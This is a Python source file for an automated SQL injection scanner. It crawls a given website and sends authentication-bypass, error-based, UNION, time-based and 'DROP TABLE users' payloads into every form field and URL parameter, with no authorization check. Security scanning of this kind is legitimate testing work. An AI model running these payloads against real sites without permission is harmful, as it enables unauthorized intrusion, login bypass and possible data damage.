import requests
import re
import time
import random
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup


class SQLInjectionScanner:
    """Tool for scanning websites for SQL Injection vulnerabilities."""
    
    def __init__(self):
        # Set user agent for requests
        self.user_agent = "Cypher-Security-Toolkit/1.0"
        
        # Default request timeout
        self.timeout = 10
        
        # Default max number of concurrent requests
        self.max_threads = 10
        
        # Basic SQL Injection payloads for testing
        self.basic_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "admin' --",
            "1' OR '1' = '1",
            "1\" OR \"1\" = \"1",
            "1' OR '1' = '1' --",
            "1\" OR \"1\" = \"1\" --",
            "1 OR 1=1"
        ]
        
        # Error-based SQL Injection payloads
        self.error_payloads = [
            "'",
            "\"",
            "\\",
            ");",
            "';",
            "\";",
            "');",
            "\");",
            "DROP TABLE users",
            "1/0",
            "' OR 1/0 --",
            "\" OR 1/0 --",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) --",
            "' UNION SELECT @@version,NULL,NULL --",
            "' UNION SELECT NULL,@@version,NULL --",
            "' UNION SELECT NULL,NULL,@@version --"
        ]
        
        # Time-based SQL Injection payloads
        self.time_payloads = [
            "' AND SLEEP(5) --",
            "\" AND SLEEP(5) --",
            "' OR SLEEP(5) --",
            "\" OR SLEEP(5) --",
            "' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
            "\" AND (SELECT * FROM (SELECT SLEEP(5))a) --",
            "' OR (SELECT * FROM (SELECT SLEEP(5))a) --",
            "\" OR (SELECT * FROM (SELECT SLEEP(5))a) --",
            "' AND pg_sleep(5) --",
            "\" AND pg_sleep(5) --",
            "' OR pg_sleep(5) --",
            "\" OR pg_sleep(5) --",
            "' AND WAITFOR DELAY '0:0:5' --",
            "\" AND WAITFOR DELAY '0:0:5' --",
            "' OR WAITFOR DELAY '0:0:5' --",
            "\" OR WAITFOR DELAY '0:0:5' --"
        ]
        
        # Common database error patterns to detect SQL errors
        self.error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"MySQL Query fail.*",
            r"SQL syntax.*MariaDB server",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            
            # Microsoft SQL Server
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            r"Microsoft SQL Native Client.*[0-9a-fA-F]{8}",
            r"ODBC SQL Server Driver",
            r"ODBC Driver \d+ for SQL Server",
            r"SQLServer JDBC Driver",
            r"com\.jnetdirect\.jsql",
            
            # Oracle
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
            
            # IBM DB2
            r"CLI Driver.*DB2",
            r"DB2 SQL error",
            r"\bdb2_\w+\(",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            
            # Generic
            r"Incorrect syntax near",
            r"Syntax error in string in query expression",
            r"ADODB\.Field \(0x800A0BCD\)",
            r"Unclosed quotation mark after the character string",
            r"Microsoft Access Driver",
            r"ODBC Microsoft Access Driver",
            r"Microsoft Access Database Engine",
            r"JET Database Engine",
            r"Access Database Engine",
            r"Syntax error \(missing operator\) in query expression",
            r"Query failed:",
            r"SQL command not properly ended",
            r"unexpected end of SQL command",
            r"Unexpected token.",
            r"unclosed quotation mark after the character string",
            r"Error converting data type.*"
        ]
        
        # Scanner state
        self.scanning = False
        self.stop_requested = False
        self.lock = threading.Lock()
        self.results = []
    
    def scan(self, url, scan_level='basic', max_urls=50, headers=None, cookies=None, forms=True, parameters=True, timeout_detection=True, callback=None):
        """
        Scan a website for SQL Injection vulnerabilities.
        
        Args:
            url: Target website URL
            scan_level: Scan level ('basic', 'advanced', 'full')
            max_urls: Maximum number of URLs to scan
            headers: Custom HTTP headers to include
            cookies: Cookies to include with requests
            forms: Whether to scan forms
            parameters: Whether to scan URL parameters
            timeout_detection: Whether to use time-based detection
            callback: Optional callback function for progress updates
            
        Returns:
            Dictionary with scan results
        """
        if self.scanning:
            return {"error": "Scan already in progress. Stop the current scan before starting a new one."}
        
        # Reset state
        self.scanning = True
        self.stop_requested = False
        self.results = []
        
        # Set custom headers
        request_headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        if headers:
            request_headers.update(headers)
        
        # Validate and normalize the URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            # Phase 1: Crawl the website and collect URLs, forms, and parameters
            if callback:
                callback({
                    'status': 'in_progress',
                    'message': "Starting SQL injection scan...",
                    'progress': 5
                })
                
            crawl_results = self._crawl_website(url, max_urls, request_headers, cookies, callback)
            
            if self.stop_requested:
                return self._scan_completed(callback, "Scan stopped by user request during crawling phase.")
            
            # Get payloads based on scan level
            if scan_level == 'basic':
                payloads = self.basic_payloads
            elif scan_level == 'advanced':
                payloads = self.basic_payloads + self.error_payloads
            else:  # 'full'
                payloads = self.basic_payloads + self.error_payloads
                if timeout_detection:
                    payloads += self.time_payloads
            
            # Phase 2: Test forms if enabled
            if forms and crawl_results['forms']:
                if callback:
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing {len(crawl_results['forms'])} forms for SQL Injection vulnerabilities...",
                        'progress': 30
                    })
                
                self._test_forms(crawl_results['forms'], payloads, request_headers, cookies, timeout_detection, callback)
                
                if self.stop_requested:
                    return self._scan_completed(callback, "Scan stopped by user request during form testing phase.")
            
            # Phase 3: Test URL parameters if enabled
            if parameters and crawl_results['parameters']:
                if callback:
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing {len(crawl_results['parameters'])} URL parameters for SQL Injection vulnerabilities...",
                        'progress': 60
                    })
                
                self._test_parameters(crawl_results['parameters'], payloads, request_headers, cookies, timeout_detection, callback)
                
                if self.stop_requested:
                    return self._scan_completed(callback, "Scan stopped by user request during parameter testing phase.")
            
            # Scan completed successfully
            return self._scan_completed(callback, "SQL Injection scan completed successfully.")
            
        except Exception as e:
            self.scanning = False
            error_message = f"Error during scan: {str(e)}"
            
            if callback:
                callback({
                    'status': 'error',
                    'message': error_message
                })
            
            return {
                'status': 'error',
                'message': error_message,
                'results': self.results
            }
    
    def stop(self):
        """Stop an ongoing scan."""
        if not self.scanning:
            return {"status": "not_scanning"}
        
        self.stop_requested = True
        return {"status": "stopping"}
    
    def _crawl_website(self, base_url, max_urls, headers, cookies, callback):
        """
        Crawl the website to find URLs, forms, and parameters.
        
        Args:
            base_url: Base URL to start crawling from
            max_urls: Maximum number of URLs to crawl
            headers: HTTP headers to use
            cookies: Cookies to use
            callback: Progress callback function
            
        Returns:
            Dictionary with discovered URLs, forms, and parameters
        """
        if callback:
            callback({
                'status': 'in_progress',
                'message': "Crawling website to discover URLs, forms, and parameters...",
                'progress': 10
            })
        
        # URLs to crawl (queue)
        urls_to_crawl = [base_url]
        
        # URLs already crawled (to avoid duplicates)
        crawled_urls = set()
        
        # Results
        discovered_urls = []
        discovered_forms = []
        discovered_parameters = []
        
        # Extract domain from base_url
        base_domain = urlparse(base_url).netloc
        
        # Start crawling
        while urls_to_crawl and len(crawled_urls) < max_urls and not self.stop_requested:
            # Get next URL to crawl
            current_url = urls_to_crawl.pop(0)
            
            # Skip if already crawled
            if current_url in crawled_urls:
                continue
            
            try:
                # Make the request
                response = requests.get(
                    current_url, 
                    headers=headers, 
                    cookies=cookies, 
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Skip non-HTML responses
                content_type = response.headers.get('Content-Type', '').lower()
                if 'text/html' not in content_type:
                    continue
                
                # Mark as crawled
                crawled_urls.add(current_url)
                discovered_urls.append(current_url)
                
                # Parse the HTML
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    
                    # Skip empty or JavaScript hrefs
                    if not href or href.startswith(('javascript:', '#', 'mailto:')):
                        continue
                    
                    # Convert relative URLs to absolute
                    absolute_url = urljoin(current_url, href)
                    
                    # Skip external domains
                    if urlparse(absolute_url).netloc != base_domain:
                        continue
                    
                    # Add to queue if not already crawled
                    if absolute_url not in crawled_urls and absolute_url not in urls_to_crawl:
                        urls_to_crawl.append(absolute_url)
                
                # Find all forms
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'get').lower()
                    
                    # Convert relative URLs to absolute
                    form_action = urljoin(current_url, form_action)
                    
                    # Skip external domains
                    if urlparse(form_action).netloc != base_domain:
                        continue
                    
                    # Get form inputs
                    inputs = []
                    for input_field in form.find_all(['input', 'textarea']):
                        input_type = input_field.get('type', '').lower()
                        input_name = input_field.get('name', '')
                        input_value = input_field.get('value', '')
                        
                        # Skip submit, button, and hidden inputs
                        if input_type in ['submit', 'button', 'hidden']:
                            continue
                        
                        # Skip inputs without a name
                        if not input_name:
                            continue
                        
                        inputs.append({
                            'name': input_name,
                            'value': input_value,
                            'type': input_type
                        })
                    
                    # Skip forms without inputs
                    if not inputs:
                        continue
                    
                    discovered_forms.append({
                        'url': current_url,
                        'action': form_action,
                        'method': form_method,
                        'inputs': inputs
                    })
                
                # Find URL parameters
                parsed_url = urlparse(current_url)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    
                    for param_name, param_values in params.items():
                        discovered_parameters.append({
                            'url': current_url,
                            'name': param_name,
                            'value': param_values[0] if param_values else ''
                        })
                
                # Update progress
                if callback and len(discovered_urls) % 5 == 0:
                    progress_percentage = min(29, 10 + int((len(discovered_urls) / max_urls) * 20))
                    callback({
                        'status': 'in_progress',
                        'message': f"Crawled {len(discovered_urls)} URLs, found {len(discovered_forms)} forms and {len(discovered_parameters)} parameters...",
                        'progress': progress_percentage
                    })
                
            except requests.RequestException:
                # Skip URLs that can't be accessed
                continue
        
        return {
            'urls': discovered_urls,
            'forms': discovered_forms,
            'parameters': discovered_parameters
        }
    
    def _test_forms(self, forms, payloads, headers, cookies, timeout_detection, callback):
        """
        Test forms for SQL Injection vulnerabilities.
        
        Args:
            forms: List of forms to test
            payloads: SQL Injection payloads to use
            headers: HTTP headers to use
            cookies: Cookies to use
            timeout_detection: Whether to use time-based detection
            callback: Progress callback function
        """
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit tasks for each form and payload combination
            future_to_test = {}
            
            for form in forms:
                if self.stop_requested:
                    break
                
                for payload in payloads:
                    if self.stop_requested:
                        break
                    
                    # Skip time-based tests if timeout_detection is disabled
                    if not timeout_detection and any(time_pattern in payload for time_pattern in ['SLEEP', 'pg_sleep', 'WAITFOR']):
                        continue
                    
                    future = executor.submit(
                        self._test_form_with_payload,
                        form,
                        payload,
                        headers,
                        cookies
                    )
                    
                    future_to_test[future] = {
                        'form': form,
                        'payload': payload
                    }
            
            # Process completed futures
            completed = 0
            total = len(future_to_test)
            
            for future in concurrent.futures.as_completed(future_to_test):
                if self.stop_requested:
                    break
                
                test_info = future_to_test[future]
                
                try:
                    # Get the result (vulnerability type if vulnerable, None otherwise)
                    vulnerability_type = future.result()
                    
                    if vulnerability_type:
                        # Add to results if vulnerable
                        self._add_result(
                            vulnerability_type,
                            test_info['form']['url'],
                            test_info['form']['action'],
                            "POST" if test_info['form']['method'] == 'post' else "GET",
                            [input_field['name'] for input_field in test_info['form']['inputs']],
                            test_info['payload']
                        )
                
                except Exception:
                    # Ignore exceptions during testing
                    pass
                
                # Update progress
                completed += 1
                if callback and completed % max(1, total // 10) == 0:
                    progress_percentage = min(59, 30 + int((completed / total) * 30))
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing forms: {completed}/{total} completed...",
                        'progress': progress_percentage
                    })
    
    def _test_form_with_payload(self, form, payload, headers, cookies):
        """
        Test a single form with a specific payload.
        
        Args:
            form: Form to test
            payload: SQL Injection payload to use
            headers: HTTP headers to use
            cookies: Cookies to use
            
        Returns:
            Vulnerability type if vulnerable, None otherwise
        """
        try:
            # Prepare form data
            data = {}
            for input_field in form['inputs']:
                data[input_field['name']] = payload
            
            # Make the baseline request first (for time-based detection)
            baseline_start_time = time.time()
            
            if form['method'] == 'post':
                baseline_response = requests.post(
                    form['action'],
                    data={input_field['name']: input_field['value'] or 'test' for input_field in form['inputs']},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                baseline_response = requests.get(
                    form['action'],
                    params={input_field['name']: input_field['value'] or 'test' for input_field in form['inputs']},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
            baseline_time = time.time() - baseline_start_time
            
            # Make the payload request
            is_time_payload = any(time_pattern in payload for time_pattern in ['SLEEP', 'pg_sleep', 'WAITFOR'])
            
            payload_start_time = time.time()
            
            if form['method'] == 'post':
                response = requests.post(
                    form['action'],
                    data=data,
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout * 2 if is_time_payload else self.timeout,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    form['action'],
                    params=data,
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout * 2 if is_time_payload else self.timeout,
                    allow_redirects=True
                )
                
            payload_time = time.time() - payload_start_time
            
            # Check for errors in the response
            for pattern in self.error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return "Error-based SQLi"
            
            # Check for login bypass if it looks like a login form
            login_patterns = ['login', 'log-in', 'log_in', 'signin', 'sign-in', 'sign_in']
            
            is_login_form = any(pattern in form['action'].lower() for pattern in login_patterns) or \
                           any(pattern in form['url'].lower() for pattern in login_patterns) or \
                           any('password' == input_field['type'].lower() for input_field in form['inputs'])
            
            if is_login_form:
                # If login form, check if we got logged in with the injection
                auth_patterns = [
                    'welcome', 'dashboard', 'profile', 'account', 'logout', 'log-out', 'log_out',
                    'signout', 'sign-out', 'sign_out', 'admin', 'member', 'user'
                ]
                
                if any(pattern in response.text.lower() for pattern in auth_patterns) or \
                   any(pattern in response.url.lower() for pattern in auth_patterns):
                    return "Authentication Bypass SQLi"
            
            # Check for time-based vulnerability
            if is_time_payload and payload_time > (baseline_time * 3) and payload_time > 4:
                return "Time-based Blind SQLi"
            
            # Check for boolean-based blind SQLi (simplified)
            if "1=1" in payload and "1=2" not in payload:
                # Save the response for comparison
                true_condition_response = response.text
                
                # Test with a false condition
                false_payload = payload.replace("1=1", "1=2")
                data_false = {}
                for input_field in form['inputs']:
                    data_false[input_field['name']] = false_payload
                
                if form['method'] == 'post':
                    false_response = requests.post(
                        form['action'],
                        data=data_false,
                        headers=headers,
                        cookies=cookies,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                else:
                    false_response = requests.get(
                        form['action'],
                        params=data_false,
                        headers=headers,
                        cookies=cookies,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                
                # If responses differ significantly, might be boolean-based blind SQLi
                if self._responses_differ(true_condition_response, false_response.text):
                    return "Boolean-based Blind SQLi"
            
            return None
            
        except requests.Timeout:
            # If it's a time-based payload and we got a timeout, it's likely vulnerable
            if any(time_pattern in payload for time_pattern in ['SLEEP', 'pg_sleep', 'WAITFOR']):
                return "Time-based Blind SQLi"
            return None
        except requests.RequestException:
            # Not vulnerable if request fails for other reasons
            return None
    
    def _test_parameters(self, parameters, payloads, headers, cookies, timeout_detection, callback):
        """
        Test URL parameters for SQL Injection vulnerabilities.
        
        Args:
            parameters: List of parameters to test
            payloads: SQL Injection payloads to use
            headers: HTTP headers to use
            cookies: Cookies to use
            timeout_detection: Whether to use time-based detection
            callback: Progress callback function
        """
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit tasks for each parameter and payload combination
            future_to_test = {}
            
            for param in parameters:
                if self.stop_requested:
                    break
                
                for payload in payloads:
                    if self.stop_requested:
                        break
                    
                    # Skip time-based tests if timeout_detection is disabled
                    if not timeout_detection and any(time_pattern in payload for time_pattern in ['SLEEP', 'pg_sleep', 'WAITFOR']):
                        continue
                    
                    future = executor.submit(
                        self._test_parameter_with_payload,
                        param,
                        payload,
                        headers,
                        cookies
                    )
                    
                    future_to_test[future] = {
                        'parameter': param,
                        'payload': payload
                    }
            
            # Process completed futures
            completed = 0
            total = len(future_to_test)
            
            for future in concurrent.futures.as_completed(future_to_test):
                if self.stop_requested:
                    break
                
                test_info = future_to_test[future]
                
                try:
                    # Get the result (vulnerability type if vulnerable, None otherwise)
                    vulnerability_type = future.result()
                    
                    if vulnerability_type:
                        # Add to results if vulnerable
                        self._add_result(
                            vulnerability_type,
                            test_info['parameter']['url'],
                            test_info['parameter']['url'],
                            "GET",
                            [test_info['parameter']['name']],
                            test_info['payload']
                        )
                
                except Exception:
                    # Ignore exceptions during testing
                    pass
                
                # Update progress
                completed += 1
                if callback and completed % max(1, total // 10) == 0:
                    progress_percentage = min(99, 60 + int((completed / total) * 39))
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing parameters: {completed}/{total} completed...",
                        'progress': progress_percentage
                    })
    
    def _test_parameter_with_payload(self, param, payload, headers, cookies):
        """
        Test a single parameter with a specific payload.
        
        Args:
            param: Parameter to test
            payload: SQL Injection payload to use
            headers: HTTP headers to use
            cookies: Cookies to use
            
        Returns:
            Vulnerability type if vulnerable, None otherwise
        """
        try:
            # Parse the URL
            parsed_url = urlparse(param['url'])
            
            # Get existing parameters
            params = parse_qs(parsed_url.query)
            
            # Make the baseline request first (for time-based detection)
            baseline_params = {}
            for key, values in params.items():
                baseline_params[key] = values[0] if values else ''
                
            baseline_url = parsed_url.scheme + '://' + parsed_url.netloc + parsed_url.path
            
            baseline_start_time = time.time()
            baseline_response = requests.get(
                baseline_url,
                params=baseline_params,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout,
                allow_redirects=True
            )
            baseline_time = time.time() - baseline_start_time
            
            # Clone the parameters and add the payload
            test_params = dict(baseline_params)
            test_params[param['name']] = payload
            
            # Make the payload request
            is_time_payload = any(time_pattern in payload for time_pattern in ['SLEEP', 'pg_sleep', 'WAITFOR'])
            
            payload_start_time = time.time()
            response = requests.get(
                baseline_url,
                params=test_params,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout * 2 if is_time_payload else self.timeout,
                allow_redirects=True
            )
            payload_time = time.time() - payload_start_time
            
            # Check for errors in the response
            for pattern in self.error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return "Error-based SQLi"
            
            # Check for time-based vulnerability
            if is_time_payload and payload_time > (baseline_time * 3) and payload_time > 4:
                return "Time-based Blind SQLi"
            
            # Check for boolean-based blind SQLi (simplified)
            if "1=1" in payload and "1=2" not in payload:
                # Save the response for comparison
                true_condition_response = response.text
                
                # Test with a false condition
                false_payload = payload.replace("1=1", "1=2")
                test_params[param['name']] = false_payload
                
                false_response = requests.get(
                    baseline_url,
                    params=test_params,
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # If responses differ significantly, might be boolean-based blind SQLi
                if self._responses_differ(true_condition_response, false_response.text):
                    return "Boolean-based Blind SQLi"
            
            return None
            
        except requests.Timeout:
            # If it's a time-based payload and we got a timeout, it's likely vulnerable
            if any(time_pattern in payload for time_pattern in ['SLEEP', 'pg_sleep', 'WAITFOR']):
                return "Time-based Blind SQLi"
            return None
        except requests.RequestException:
            # Not vulnerable if request fails for other reasons
            return None
    
    def _responses_differ(self, response1, response2):
        """
        Check if two responses differ significantly, indicating a boolean-based vulnerability.
        
        Args:
            response1: First response text
            response2: Second response text
            
        Returns:
            Boolean indicating if responses differ significantly
        """
        # Very basic check - compare response lengths
        # In a real implementation, you'd want more sophisticated comparison
        length_diff = abs(len(response1) - len(response2))
        
        # Calculate length difference percentage
        if max(len(response1), len(response2)) > 0:
            length_diff_percent = (length_diff / max(len(response1), len(response2))) * 100
            if length_diff_percent > 10:  # If differ by more than 10%
                return True
        
        # Check for key phrases that might indicate success vs failure
        success_phrases = ['success', 'welcome', 'logged in', 'dashboard', 'profile']
        error_phrases = ['error', 'invalid', 'failed', 'incorrect', 'wrong']
        
        success_in_response1 = any(phrase in response1.lower() for phrase in success_phrases)
        success_in_response2 = any(phrase in response2.lower() for phrase in success_phrases)
        
        error_in_response1 = any(phrase in response1.lower() for phrase in error_phrases)
        error_in_response2 = any(phrase in response2.lower() for phrase in error_phrases)
        
        # If one has success phrases and the other has error phrases, they differ significantly
        if (success_in_response1 and error_in_response2) or (error_in_response1 and success_in_response2):
            return True
        
        return False
    
    def _add_result(self, vuln_type, url, test_url, method, parameters, payload):
        """
        Add a vulnerability result to the results list.
        
        Args:
            vuln_type: Type of vulnerability (Error-based, Time-based, Boolean-based, Authentication Bypass)
            url: Original URL
            test_url: URL that was tested
            method: HTTP method used
            parameters: Affected parameters
            payload: SQL Injection payload used
        """
        with self.lock:
            self.results.append({
                'type': vuln_type,
                'url': url,
                'test_url': test_url,
                'method': method,
                'parameters': parameters,
                'payload': payload,
                'timestamp': time.time()
            })
    
    def _scan_completed(self, callback, message):
        """
        Finalize the scan and return results.
        
        Args:
            callback: Progress callback function
            message: Completion message
            
        Returns:
            Dictionary with scan results
        """
        self.scanning = False
        
        # Sort results by URL
        sorted_results = sorted(self.results, key=lambda x: x['url'])
        
        # Group results by URL
        grouped_results = {}
        for result in sorted_results:
            url = result['url']
            if url not in grouped_results:
                grouped_results[url] = []
            grouped_results[url].append(result)
        
        # Final result
        final_result = {
            'status': 'completed',
            'message': message,
            'vulnerability_count': len(sorted_results),
            'vulnerable_urls': len(grouped_results),
            'results': sorted_results,
            'grouped_results': grouped_results,
            'vulnerability_types': self._summarize_vulnerability_types()
        }
        
        # Call the callback with the final result
        if callback:
            callback({
                'status': 'completed',
                'message': message,
                'progress': 100,
                'vulnerability_count': len(sorted_results),
                'vulnerable_urls': len(grouped_results),
                'vulnerability_types': self._summarize_vulnerability_types()
            })
        
        return final_result
    
    def _summarize_vulnerability_types(self):
        """
        Summarize the types of vulnerabilities found.
        
        Returns:
            Dictionary with counts of each vulnerability type
        """
        types = {
            'Error-based SQLi': 0,
            'Time-based Blind SQLi': 0,
            'Boolean-based Blind SQLi': 0,
            'Authentication Bypass SQLi': 0
        }
        
        for result in self.results:
            if result['type'] in types:
                types[result['type']] += 1
        
        return types